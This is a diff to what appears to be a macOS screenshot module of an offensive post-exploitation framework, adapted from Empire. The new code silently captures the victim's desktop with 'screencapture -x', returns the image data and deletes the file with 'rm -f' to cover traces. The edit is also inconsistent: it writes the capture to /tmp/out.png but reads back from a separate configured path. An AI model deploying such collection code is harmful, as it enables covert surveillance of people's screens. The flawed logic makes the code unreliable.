@@ -5,13 +5,13 @@ class Module:
         # metadata info about the module, not modified during runtime
         self.info = {
             # name for the module that will appear in module menus
-            'Name': 'NativeScreenshot',
+            'Name': 'Screenshot',
 
             # list of one or more authors for the module
-            'Author': ['@xorrior'],
+            'Author': ['@harmj0y'],
 
             # more verbose multi-line description of the module
-            'Description': ('Takes a screenshot of an OSX desktop using the Python Quartz libraries and returns the data.'),
+            'Description': ('Takes a screenshot of an OSX desktop using screencapture and returns the data.'),
 
             # True if the module needs to run in the background
             'Background': False,
@@ -72,30 +72,11 @@ class Module:
         savePath = self.options['SavePath']['Value']
 
         script = """
-import Foundation
-import Quartz
-import Quartz.CoreGraphics as CG
-from Cocoa import NSURL
-import LaunchServices
-
-region = CG.CGRectInfinite
-path = '%s'
-image = CG.CGWindowListCreateImage(region, CG.kCGWindowListOptionOnScreenOnly, CG.kCGNullWindowID, CG.kCGWindowImageDefault)
-imagepath = NSURL.fileURLWithPath_(path)
-dest = Quartz.CGImageDestinationCreateWithURL(
-    imagepath,
-    LaunchServices.kUTTypePNG,
-    1,
-    None)
-properties = {
-    Quartz.kCGImagePropertyDPIWidth: 1024,
-    Quartz.kCGImagePropertyDPIHeight: 720,
-}
-
-Quartz.CGImageDestinationAddImage(dest, image, properties)
-Quartz.CGImageDestinationFinalize(dest)
-
-f = open(path, 'rb')
+# take a screenshot using screencapture
+run_command('screencapture -x /tmp/out.png')
+# base64 up resulting file, delete the file, return the base64 of the png output
+#   mocked from the Empire screenshot module
+f = open('%s', 'rb')
 data = f.read()
 f.close()
 run_command('rm -f %s')
